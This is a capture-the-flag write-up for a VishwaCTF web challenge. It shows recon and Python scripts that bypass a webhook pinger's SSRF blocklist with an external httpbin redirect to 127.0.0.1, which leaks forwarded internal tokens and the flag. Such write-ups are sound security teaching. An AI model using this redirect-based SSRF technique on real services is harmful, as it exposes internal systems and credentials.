# BlackBox Mail Relay II — Ghost in the Queue

## Summary

The SMTP service on `2527` is the obvious entrypoint, but the real break was on the same host:

- `3002` exposed `WebhookPinger — Internal Debugger`
- `3002/source` leaked an SSRF design note
- the pinger followed redirects and forwarded internal headers

That made it possible to bounce a request from an external URL into an internal-only service on `127.0.0.1`.

## Recon

Initial SMTP recon on `2527` showed custom commands and a fake-hardening path:

- `AUTH_TOKEN`
- `HELP QUEUE`
- `RETR`
- `EHLO debug.internal.local` leaked:
  - `250-SIZE 6B65795F`
  - `334 CHALLENGE:<random>`

That looked intentional, but the auth path was a time sink. A full host scan found more services:

- `3000` Express app
- `3001` Express app
- `3002` Express app
- `5000/5001/8080/8081/8082` web services
- `2525/2526/2527` SMTP variants

## Key Leak

`http://smtp.vishwactf.com:3002/source` exposed internal notes for `WebhookPinger`:

- hostname-based SSRF blocklist
- redirects are followed
- internal headers are attached
- all headers are forwarded across redirects

To confirm the forwarded headers, I used the pinger against `https://httpbin.org/anything`:

```bash
python - <<'PY'
import requests
r=requests.post(
    'http://smtp.vishwactf.com:3002/api/ping',
    json={'webhook_url':'https://httpbin.org/anything'},
    timeout=15
)
print(r.text)
PY
```

That revealed:

- `X-Internal-Token: 0a9942a27fd1d40a58c688b9d7e5a3f204213e9a42b41a6aed776a1f80f14d22`
- `X-Webhook-Signature: 9bbd6cbdda7ecb628cd5acb58d3e08d96e91f1d493536be22d07b4e74cebc2db`

## SSRF Bypass

Direct loopback targets were blocked by the pinger:

- `http://127.0.0.1:3001/api/init` -> blocked

But the source note already said redirects were followed after the initial hostname check, so I used `httpbin` as an external redirector:

```bash
python - <<'PY'
import requests, urllib.parse
target='http://127.0.0.1:8081/'
redir='https://httpbin.org/redirect-to?url='+urllib.parse.quote(target,safe='')
r=requests.post(
    'http://smtp.vishwactf.com:3002/api/ping',
    json={'webhook_url':redir},
    timeout=15
)
print(r.text)
PY
```

That reached an internal-only service and returned:

```json
{"message":"Internal webhook service","endpoints":["/flag"]}
```

## Flag

The final request was:

```bash
python - <<'PY'
import requests, urllib.parse
target='http://127.0.0.1:8081/flag'
redir='https://httpbin.org/redirect-to?url='+urllib.parse.quote(target,safe='')
r=requests.post(
    'http://smtp.vishwactf.com:3002/api/ping',
    json={'webhook_url':redir},
    timeout=15
)
print(r.text)
PY
```

Response:

```json
{"success":true,"status":200,"preview":"{\"flag\":\"VishwaCTF{y0u_f0ll0w3d_th3_r3d1r3ct_l1k3_a_pr0_4nd_tr1ck3d_th3_s3rv3r_1nt0_c4ll1ng_b4ck_h0m3_wh1l3_r4j_w4s_ch1ll1ng_1n_g04_gg_w3ll_pl4y3d_h4x0r}\"}"}
```

## Final Flag

`VishwaCTF{y0u_f0ll0w3d_th3_r3d1r3ct_l1k3_a_pr0_4nd_tr1ck3d_th3_s3rv3r_1nt0_c4ll1ng_b4ck_h0m3_wh1l3_r4j_w4s_ch1ll1ng_1n_g04_gg_w3ll_pl4y3d_h4x0r}`
